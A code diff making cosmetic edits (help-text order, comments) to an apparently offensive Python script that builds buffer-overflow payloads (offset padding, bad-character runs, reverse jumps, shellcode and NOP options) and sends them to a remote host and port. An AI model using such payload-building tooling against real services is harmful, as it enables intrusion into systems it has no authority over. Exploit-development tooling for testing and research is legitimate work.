@@ -39,9 +39,9 @@ def print_usage(scriptName):
 
 	print("Parameters:")
 	print("")
-	print(" -h|--help	: Show script usage.")
-	print(" -n|--norec	: Don't wait for receive message after connect.")
-	print(" -m|--mode	: Select script mode (test|cyclic|write|exploit).")
+	print(" --help|-h	: Show script usage.")
+	print(" --norec|-n	: Don't wait for receive message after connect.")
+	print(" --mode|-m	: Select script mode (test|cyclic|write|exploit).")
 	print(" --rhost		: Remote host IP.")
 	print(" --rport		: Remote host port.")
 	print(" --buffsize	: Amount of variable bytes to send.")
@@ -208,7 +208,7 @@ def create_write_payload(buffHead, buffSize, offsetCount, binContent):
 
 	return payload
 
-# write bad chars before content
+# write - bad chars before content
 def create_badchar_payload_before(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, excludeChars=""):
 	# badchars
 	badChars = create_bad_chars(0, excludeChars)
@@ -237,7 +237,7 @@ def create_badchar_payload_before(buffHead, buffSize, offsetCount, binContent, r
 
 	return payload
 
-# write bad chars after content
+# write - bad chars after content
 def create_badchar_payload_after(buffHead, buffSize, offsetCount, binContent, excludeChars=""):
 	# offset
 	offset = b'A' * int(offsetCount)
@@ -307,8 +307,7 @@ if __name__ == "__main__":
 	try:
 		opts, args = getopt.getopt(sys.argv[1:], "hnm:", ["help", "norec", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "badchar=", "exclude=", "reversejmp=", "shellcode=", "nops="])
 	except getopt.GetoptError as err:
-		# print help information and exit:
-		print("Error:", err)  # will print something like "option -a not recognized"
+		print("Error:", err)
 		print_usage(scriptName)
 		sys.exit(1)	
 	
